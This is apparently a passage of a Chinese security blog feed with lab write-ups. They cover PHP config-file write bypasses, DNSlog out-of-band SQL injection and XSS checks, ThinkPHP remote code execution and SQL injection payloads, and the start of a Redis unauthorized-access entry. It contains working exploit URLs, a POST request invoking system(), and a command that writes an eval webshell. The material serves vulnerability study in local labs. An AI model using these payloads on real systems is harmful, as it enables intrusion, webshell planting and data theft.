        <content type="html"><![CDATA[<h2 id="0x00-PHP配置漏洞"><a href="#0x00-PHP配置漏洞" class="headerlink" title="0x00 PHP配置漏洞"></a>0x00 PHP配置漏洞</h2><p><strong>冬夜读书示子聿</strong> ——陆游（宋）</p><p>古人学问无遗力，少壮工夫老始成。<br>纸上得来终觉浅，绝知此事要躬行。</p><h2 id="0x01-基础版"><a href="#0x01-基础版" class="headerlink" title="0x01 基础版"></a>0x01 基础版</h2><ol><li>特点：正则贪婪模式，无S单行模式：</li><li>环境准备：</li></ol><p><strong>test.php</strong></p><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/\\\$API=&#39;.*&#39;;/&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><p><strong>test1.php</strong></p><pre><code>$API=&#39;&#39;;</code></pre><ol><li>访问测试：<a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/1.png" alt></li><li>值 1 已写入到文件</li><li>利用换行符 %0a 绕过正则测试：<a href="http://127.0.0.1/test.php?api=1%27;%0a" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;%0a</a>&lt;?php%0aphpinfo();//</li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/2.png" alt></li><li>test1.php被写入内容：</li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/3.png" alt></li><li>访问test1.php</li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/4.png" alt></li></ol><p><strong>test1.php</strong></p><pre><code>&lt;?php$API=&#39;&#39;;</code></pre><ol><li>测试2</li><li>访问：<a href="http://127.0.0.1/test.php?api=2%27;%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=2%27;%0aphpinfo();//</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/5.png" alt></li><li>phpinfo()已换行写入，但是在单引号中，只当作字符串。</li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/6.png" alt></li><li>再访问：<a href="http://127.0.0.1/test.php?api=2" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=2</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/7.png" alt></li><li>然后利用原闭合单引号来闭合</li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/8.png" alt></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/9.png" alt></li></ol><h2 id="0x02-单行模式"><a href="#0x02-单行模式" class="headerlink" title="0x02 单行模式"></a>0x02 单行模式</h2><ol><li>特点：正则贪婪模式，正则添加s修饰符，防止换行绕过</li><li>s：匹配任何空白字符（空格 ，制表符\t，垂直制表符\v，换页符\f，换行符\n）</li><li>环境准备：</li></ol><p><strong>test.php</strong></p><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/\\\$API=&#39;.*&#39;;/s&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><p><strong>test1.php</strong></p><pre><code>&lt;?php $API=&#39;&#39;;</code></pre><ol><li>访问测试：<a href="http://127.0.0.1/test.php?api=;phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=;phpinfo()</a>;</li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/10.png" alt></li><li>利用正则替换（$0）来绕过：<a href="http://127.0.0.1/test.php?api=$0" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=$0</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/11.png" alt></li></ol><h2 id="0x03-基础版非贪婪模式"><a href="#0x03-基础版非贪婪模式" class="headerlink" title="0x03 基础版非贪婪模式"></a>0x03 基础版非贪婪模式</h2><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/\\\$API=&#39;.*?&#39;;/&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php $API=&#39;&#39;;</code></pre><p><strong>与基础版一样</strong></p><ol><li><a href="http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//</a></li><li><a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li></ol><h2 id="0x04-单行非贪婪模式"><a href="#0x04-单行非贪婪模式" class="headerlink" title="0x04 单行非贪婪模式"></a>0x04 单行非贪婪模式</h2><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/\\\$API=&#39;.*?&#39;;/s&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php $API=&#39;&#39;;</code></pre><p><strong>测试1</strong></p><ol><li><a href="http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/12.png" alt></li><li><a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/13.png" alt></li></ol><p><strong>测试2</strong></p><ol><li><a href="http://127.0.0.1/test.php?api=1%27;phpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;phpinfo();//</a> </li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/14.png" alt></li><li><a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/15.png" alt></li><li>或者</li><li><a href="http://127.0.0.1/test.php?api=1%27;phpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;phpinfo();//</a>  #执行两次</li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/16.png" alt></li></ol><h2 id="0x05-define基础版"><a href="#0x05-define基础版" class="headerlink" title="0x05 define基础版"></a>0x05 define基础版</h2><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*&#39;\);/&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php define(&#39;API&#39;,&#39;&#39;);</code></pre><ol><li>测试：<a href="http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/17.png" alt></li></ol><h2 id="0x06-define单行版"><a href="#0x06-define单行版" class="headerlink" title="0x06 define单行版"></a>0x06 define单行版</h2><ol><li>特点：define基础版加s修饰符</li></ol><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*&#39;\);/s&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php define(&#39;API&#39;,&#39;&#39;);</code></pre><ol><li>与define基础版一样，测试：<a href="http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=\%27);%0aphpinfo();//</a></li></ol><h2 id="0x07-define基础版非贪婪版"><a href="#0x07-define基础版非贪婪版" class="headerlink" title="0x07 define基础版非贪婪版"></a>0x07 define基础版非贪婪版</h2><ol><li>特点：define基础版非贪婪模式</li></ol><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*?&#39;\);/&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php define(&#39;API&#39;,&#39;&#39;);</code></pre><ol><li>测试：<a href="http://127.0.0.1/test.php?api=%27);%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=%27);%0aphpinfo();//</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/18.png" alt></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/19.png" alt></li><li>闭合单引号测试：<a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/20.png" alt></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/21.png" alt></li></ol><h2 id="0x08-define单行非贪婪版"><a href="#0x08-define单行非贪婪版" class="headerlink" title="0x08 define单行非贪婪版"></a>0x08 define单行非贪婪版</h2><pre><code>&lt;?php $api=addslashes($_GET[&#39;api&#39;]);print_r($api);echo &quot;&lt;br&gt;&quot;;$file=file_get_contents(&#39;./test1.php&#39;);print_r($file);echo &quot;&lt;br&gt;&quot;;$file=preg_replace(&quot;/define\(&#39;API&#39;,&#39;.*?&#39;\);/s&quot;,&quot;define(&#39;API&#39;,&#39;{$api}&#39;);&quot;,$file);var_dump($file);file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><ol><li>测试：<a href="http://127.0.0.1/test.php?api=%27);phpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=%27);phpinfo();//</a></li><li><a href="http://127.0.0.1/test.php?api=" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=</a></li><li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/22.png" alt></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSlog</title>
      <link href="/DNSlog/"/>
      <url>/DNSlog/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><ol><li>安全测试时，有些操作很难明显验证或利用，DNSlog可以当作回显证明。</li><li>具体原理：</li><li><img src="/DNSlog/6.png" alt></li><li>红色部分可控，可自主搭建DNS服务器（这里使用在线的DNSlog平台），来获取DNS解析日志来验证测试结果。</li></ol><h2 id="0x01-DNSlog平台"><a href="#0x01-DNSlog平台" class="headerlink" title="0x01 DNSlog平台"></a>0x01 DNSlog平台</h2><ol><li>在线DNSlog平台：</li><li><ul><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li></ul></li><li><ul><li><a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a></li></ul></li></ol><h2 id="0x02-子域"><a href="#0x02-子域" class="headerlink" title="0x02 子域"></a>0x02 子域</h2><ol><li>每个用户都有唯一的子域值：<strong>[用户唯一标识字符串].ceye.io</strong> #其他网站有其他的域名。</li></ol><h2 id="0x03-简单测试"><a href="#0x03-简单测试" class="headerlink" title="0x03 简单测试"></a>0x03 简单测试</h2><ol><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li><li>获取子域值（识别码）</li><li><img src="/DNSlog/1.png" alt></li><li><strong>curl [任意字符].[用户唯一标识字符串].ceye.io</strong></li><li><img src="/DNSlog/2.png" alt></li><li>查看ceye.io的http请求记录</li><li><img src="/DNSlog/3.png" alt></li><li><strong>ping [任意字符].[用户唯一标识字符串].ceye.io</strong></li><li><img src="/DNSlog/4.png" alt></li><li>查看ceye.io的DNS查询记录</li><li><img src="/DNSlog/5.png" alt></li></ol><h2 id="0x04-环境测试"><a href="#0x04-环境测试" class="headerlink" title="0x04 环境测试"></a>0x04 环境测试</h2><p><strong>sql盲注</strong></p><ol><li>使用load_file()函数来加载，前提：secure_file_priv的值为空</li><li>mysql命令查询：</li><li><strong>select variables like ‘%secure%’;</strong></li><li><img src="/DNSlog/7.png" alt></li><li>空，即可读取磁盘的目录</li><li>如果是C:\，/root等等指定的盘符目录，即可读取指定盘符目录下的文件</li><li>null，则不能加载文件。</li><li>可修改配置文件mysql.ini来设置secure_file_priv的值</li><li>修改[mysqld]下：secure_file_priv=””，没有就在末尾添加secure_file_priv=””</li><li>修改后，重启mysql，测试加载本地文件：</li><li><img src="/DNSlog/8.png" alt></li><li><img src="/DNSlog/9.png" alt></li><li>通过load_file()来发起URL连接，格式：\URL</li><li><strong>select load_file(‘\\mysql.[用户唯一标识字符串].ceye.io\test’);</strong></li><li><img src="/DNSlog/10.png" alt></li><li>使用sqli-labs靶场的盲注测试</li><li><a href="http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;</a> and if((select load_file(‘\\sqli.[用户唯一标识字符串].ceye.io\test’)),1,0)%23</li><li><img src="/DNSlog/11.png" alt></li></ol><p><strong>XSS</strong></p><ol><li>dvwa的xss例子</li><li><img src="/DNSlog/12.png" alt></li><li><img src="/DNSlog/13.png" alt></li><li>&lt;img src=<a href="http://xss.[用户唯一标识字符串].ceye.io&gt;" target="_blank" rel="noopener">http://xss.[用户唯一标识字符串].ceye.io&gt;</a></li><li><img src="/DNSlog/14.png" alt></li><li><img src="/DNSlog/15.png" alt></li></ol><p>还有SSRF（无回显），命令执行（无回显）等等</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ol><li>任何可以访问或请求URL的地方，即可利用DNSlog验证。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp</title>
      <link href="/Thinkphp/"/>
      <url>/Thinkphp/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Thinkphp"><a href="#0x00-Thinkphp" class="headerlink" title="0x00 Thinkphp"></a>0x00 Thinkphp</h2><ol><li>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架。</li><li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub的github资源</a></li></ol><h2 id="0x10-Thinkphp-2-x-任意代码执行漏洞"><a href="#0x10-Thinkphp-2-x-任意代码执行漏洞" class="headerlink" title="0x10 Thinkphp 2.x 任意代码执行漏洞"></a>0x10 Thinkphp 2.x 任意代码执行漏洞</h2><h3 id="0x11-简介"><a href="#0x11-简介" class="headerlink" title="0x11 简介"></a>0x11 简介</h3><ol><li>ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：</li></ol><pre><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></pre><ol><li>用户输入的参数被插入双引号中执行，造成任意代码执行漏洞，thinkphp3.0版本因为lite模式下没有修复该漏洞而同样存在此漏洞。</li><li>在PHP7以上就不支持/e修饰符了。</li></ol><h3 id="0x12-环境"><a href="#0x12-环境" class="headerlink" title="0x12 环境"></a>0x12 环境</h3><ol><li>docker搭建</li><li>docker-compose up -d</li><li><img src="/Thinkphp/1.png" alt></li><li>环境搭建成功</li><li><img src="/Thinkphp/2.png" alt></li><li>漏洞复现：<code>http://127.0.0.1:8080/index.php?s=/index/index/name/${phpinfo()}</code></li><li><img src="/Thinkphp/3.png" alt></li><li><strong>其他</strong></li><li><code>http://192.168.100.4:8080/index.php?s=/index/index/name/${@print(THINK_VERSION)}</code></li><li><code>http://192.168.100.4:8080/index.php?s=/index/index/name/${@print(eval($_POST[c]))}</code> #菜刀连接，密码c</li></ol><h2 id="0x20-Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#0x20-Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="0x20 Thinkphp5 5.0.22/5.1.29 远程代码执行漏洞"></a>0x20 Thinkphp5 5.0.22/5.1.29 远程代码执行漏洞</h2><h3 id="0x21-简介"><a href="#0x21-简介" class="headerlink" title="0x21 简介"></a>0x21 简介</h3><ol><li>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</li><li>CVE-2019-9082</li><li>5.0&lt;=thinkphp5&lt;=5.0.22</li><li>5.1&lt;=thinkphp5&lt;=5.1.30</li></ol><h3 id="0x22-环境"><a href="#0x22-环境" class="headerlink" title="0x22 环境"></a>0x22 环境</h3><ol><li>进入环境目录，拉取环境：</li><li>docker-compose up -d </li><li><img src="/Thinkphp/7.png" alt></li><li>访问默认启动页面：<a href="http://192.168.100.4:8080/" target="_blank" rel="noopener">http://192.168.100.4:8080/</a></li><li><img src="/Thinkphp/5.png" alt></li><li>访问phpinfo，执行phpinfo()代码：<code>http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></li><li><img src="/Thinkphp/6.png" alt></li><li>执行代码：<code>http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id</code></li><li><img src="/Thinkphp/8.png" alt></li><li>命令执行：<code>http://192.168.100.4:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code> #www-data www-data</li><li>写入文件：<code>http://192.168.100.4:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码</code></li><li>shell：<code>http://192.168.100.4:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=a.php&amp;vars[1][]=&lt;?php eval(@$_POST[&#39;a&#39;]);?&gt;</code></li><li><a href="http://192.168.100.4:8080/a.php" target="_blank" rel="noopener">http://192.168.100.4:8080/a.php</a></li></ol><h2 id="0x30-ThinkPHP5-5-0-23-远程代码执行漏洞"><a href="#0x30-ThinkPHP5-5-0-23-远程代码执行漏洞" class="headerlink" title="0x30 ThinkPHP5 5.0.23 远程代码执行漏洞"></a>0x30 ThinkPHP5 5.0.23 远程代码执行漏洞</h2><h3 id="0x31-简介"><a href="#0x31-简介" class="headerlink" title="0x31 简介"></a>0x31 简介</h3><ol><li>ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</li></ol><h3 id="0x32-环境"><a href="#0x32-环境" class="headerlink" title="0x32 环境"></a>0x32 环境</h3><ol><li>进入环境目录，拉取环境：</li><li>docker-compose up -d</li><li><img src="/Thinkphp/9.png" alt></li><li>访问默认启动页面：<a href="http://192.168.100.4:8080/" target="_blank" rel="noopener">http://192.168.100.4:8080/</a></li><li><img src="/Thinkphp/10.png" alt></li></ol><pre><code>POST /index.php?s=captcha HTTP/1.1Host: 192.168.100.4:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></pre><ol><li><img src="/Thinkphp/11.png" alt></li></ol><h2 id="0x40-ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露"><a href="#0x40-ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露" class="headerlink" title="0x40 ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露"></a>0x40 ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</h2><h3 id="0x41-环境"><a href="#0x41-环境" class="headerlink" title="0x41 环境"></a>0x41 环境</h3><ol><li>进入环境目录，拉取环境：</li><li>docker-compose up -d</li><li><img src="/Thinkphp/12.png" alt></li><li>漏洞测试：<code>http://192.168.100.4/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></li><li><img src="/Thinkphp/13.png" alt></li></ol><h2 id="0x50-其他"><a href="#0x50-其他" class="headerlink" title="0x50 其他"></a>0x50 其他</h2><p><strong>Thinkphp 3.x order by 注入漏洞</strong></p><ol><li>版本：3.2.3、5.1.22及以下版本</li><li><code>/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1</code></li></ol><p><strong>Thinkphp 3.2.3 update注入漏洞</strong></p><ol><li>版本：3.2.3及以下版本</li><li><code>money[]=1123&amp;user=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</code></li></ol><p><strong>Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞</strong></p><ol><li>版本：3.2.3及以下版本</li><li><code>/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</code></li><li><code>/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</code></li><li><code>/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</code></li></ol><ol><li>版本号：5.0.8-5.0.19</li><li>s=whoami&amp;_method=__construct&amp;filter&amp;filter=system</li><li>版本号：5.0.20-5.0.23</li><li>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</li><li>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub的github资源</a></li><li><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">https://xz.aliyun.com/</a></li><li><a href="https://wiki.0-sec.org/" target="_blank" rel="noopener">零组资料文库</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> CVE </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未授权访问漏洞</title>
      <link href="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-未授权漏洞"><a href="#0x00-未授权漏洞" class="headerlink" title="0x00 未授权漏洞"></a>0x00 未授权漏洞</h2><ol><li>未授权漏洞，指网页、主机或服务等等因缺少安全配置或权限设置存在缺陷导致无访问权限的其他用户可以直接访问，容易造成用户信息或目录被泄露，数据或数据库被增删改查等等危害。</li></ol><h2 id="0x10-Redis"><a href="#0x10-Redis" class="headerlink" title="0x10 Redis"></a>0x10 Redis</h2><h3 id="0x11-简介"><a href="#0x11-简介" class="headerlink" title="0x11 简介"></a>0x11 简介</h3><ol><li>默认情况下，会绑定0.0.0.0:6379。</li><li>如果没有安全设置相关权限，如无密码可登录，访问ip无限制，用户弱密码等等，redis就有易被入侵的隐患。</li><li>攻击者可利用未授权漏洞访问redis，读取数据，利用config命令进行写操作，写入可利用文件，导致被完全控制等等。</li></ol><h3 id="0x12-环境"><a href="#0x12-环境" class="headerlink" title="0x12 环境"></a>0x12 环境</h3><ol><li>Centos 7</li><li><a href="https://redis.io/download" target="_blank" rel="noopener">redis官网下载</a></li><li><a href="https://code.google.com/archive/p/redis/downloads" target="_blank" rel="noopener">redis历史版本下载</a></li><li>安装：wget <a href="http://download.redis.io/releases/redis-5.0.8.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-5.0.8.tar.gz</a></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1.png" alt></li><li>解压压缩包：tar zxvf redis-5.0.8.tar.gz </li><li>进入目录：cd redis-5.0.8</li><li>编译：make</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/2.png" alt></li><li>cd src/</li><li>启动redis server：./redis-server</li><li>使用redis.conf文件中的配置启动redis server：./redis-server ../redis.conf</li></ol><h3 id="0x13-终端运行客户端"><a href="#0x13-终端运行客户端" class="headerlink" title="0x13 终端运行客户端"></a>0x13 终端运行客户端</h3><ol><li>启动redis cli：./redis-cli</li><li>获取所有配置项</li><li>127.0.0.1:6379&gt; config get *</li><li>编辑配置</li><li>127.0.0.1:6379&gt; config set [key] [value]</li><li>查看是否设置密码</li><li>127.0.0.1:6379&gt; config get requirepass</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/6.png" alt></li><li>设置密码</li><li>127.0.0.1:6379&gt; config set requirepass [password]</li><li>还可以修改redis.conf文件</li><li>修改# requirepass foobared 为 requirepass [password]</li></ol><h3 id="0x14-图形化windows-redis客户端"><a href="#0x14-图形化windows-redis客户端" class="headerlink" title="0x14 图形化windows redis客户端"></a>0x14 图形化windows redis客户端</h3><ol><li><a href="https://github.com/caoxinyu/RedisClient/releases" target="_blank" rel="noopener">图形化redis客户端</a></li><li>下载jar版：<a href="https://github.com/caoxinyu/RedisClient/blob/windows/release/redisclient-win32.x86_64.2.0.jar?raw=true" target="_blank" rel="noopener">redisclient-win32.x86_64.2.0.jar</a></li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3.png" alt></li><li>登录</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/4.png" alt></li><li>登录不了</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5.png" alt></li><li>修改redis.conf</li><li>bind 127.0.0.1前加上#</li><li>重启redis</li><li>./redis-cli -h 127.0.0.1 -p 6379 shutdown #（源码安装的重启方式）</li><li>再启动登录</li><li>./redis-server ../redis.conf</li><li>继续报错</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/7.png" alt></li><li>原因是保护模式禁止无密码登录，修改配置或修改配置文件</li><li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8.png" 